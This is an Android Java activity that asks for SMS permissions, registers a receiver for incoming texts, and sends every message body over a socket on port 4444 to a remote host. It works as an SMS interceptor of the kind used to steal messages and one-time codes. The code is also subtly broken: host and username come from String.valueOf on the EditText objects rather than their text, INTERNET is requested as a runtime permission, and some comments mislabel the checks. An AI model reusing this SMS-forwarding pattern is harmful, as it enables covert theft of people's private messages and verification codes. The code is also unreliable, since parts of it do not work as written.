package com.example.myapplication;
import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


public class MainActivity extends AppCompatActivity {

    public static final int REQUEST_READ_SMS = 80;
    public static final int RECEIVE_SMS = 81;
    private BroadcastReceiver smsReceiver;
    Object[] sms_arr = {};
    Thread checker;
    Connector conn;


    public static Object[] add(Object[] arr, Object... elements){
        Object[] tempArr = new Object[arr.length+elements.length];
        System.arraycopy(arr, 0, tempArr, 0, arr.length);

        for(int i=0; i < elements.length; i++)
            tempArr[arr.length+i] = elements[i];
        return tempArr;

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String host = String.valueOf((EditText)findViewById(R.id.editText));
        String username = String.valueOf((EditText)findViewById(R.id.editText2));

        conn = new Connector(username, host);


        // Проверка прав на получение смс
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.READ_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_SMS},
                        REQUEST_READ_SMS);
            }
        } else {
            // Permission has already been granted
        }

        // Проверка прав на получение контактов
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.RECEIVE_SMS)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECEIVE_SMS},
                        RECEIVE_SMS);
            }
        } else {
            // Permission has already been granted
        }
        // Проверка прав на получение контактов
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {
            if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                    Manifest.permission.INTERNET)) {

            } else {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.INTERNET},
                        78);
            }
        } else {
            // Permission has already been granted
        }

        initializeSMSReceiver();
        registerSMSReceiver();



    }

    private void initializeSMSReceiver() {
        smsReceiver = new BroadcastReceiver(){
            @Override
            public void onReceive(Context context, Intent intent) {

                Bundle bundle = intent.getExtras();
                if(bundle!=null){
                    Object[] pdus = (Object[])bundle.get("pdus");
                    for(int i=0;i<pdus.length;i++){
                        byte[] pdu = (byte[])pdus[i];
                        SmsMessage message = SmsMessage.createFromPdu(pdu);
                        String text = message.getDisplayMessageBody();
                        Object[] objArr = add(sms_arr, text);
                        sms_arr = objArr;
                        Log.i("log", text);

                        conn.SendSocket(text, 4444);

                    }
                }
            }
        };
    }

    private void registerSMSReceiver(){
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(smsReceiver, intentFilter);
    }

    public void onMyButtonClick(View view) {
        Toast.makeText(this, "fffff", Toast.LENGTH_SHORT).show();

    }

    public void StartButton(View view) {
        System.out.println("Button start");
        conn.StartConnector();


    }

    public void StopButton(View view) {
        System.out.println("Button stop");
        conn.StopConnector();

        TextView status = findViewById(R.id.textView2);
        status.setText("Stopped");

    }


}
